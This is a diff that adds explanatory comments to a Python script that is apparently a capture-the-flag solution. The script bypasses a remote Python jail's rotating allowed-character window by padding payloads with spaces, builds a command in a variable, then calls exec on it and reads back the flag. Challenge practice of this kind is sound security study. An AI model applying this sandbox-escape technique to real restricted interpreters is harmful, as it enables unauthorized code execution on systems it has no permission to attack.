@@ -13,11 +13,11 @@ for char in command:
     payload = "a+="
     window = set("abcdefghijklm")
     for _ in range(3):
-        window = set(chr((ord(a) - ord("a") + 1) % 26 + ord("a")) for a in window)
+        window = set(chr((ord(a) - ord("a") + 1) % 26 + ord("a")) for a in window) # copy server state of window
     if char.isalpha():
         while char not in window:
-            window = set(chr((ord(a) - ord("a") + 1) % 26 + ord("a")) for a in window)
-            payload += " "
+            window = set(chr((ord(a) - ord("a") + 1) % 26 + ord("a")) for a in window) 
+            payload += " " # keep adding space until the window includes our char
 
     payload += 25 * " "
     payload += '"'
@@ -26,7 +26,7 @@ for char in command:
 
     conn.sendline(payload.encode())
 
-conn.sendline("b =                2;exec(a)".encode())
+conn.sendline("b =                2;exec(a)".encode()) # same idea to shift window to make exec legal
 
 print("getting the flag now:")
 print(conn.recvline().decode().strip().replace(">>> ", ""))
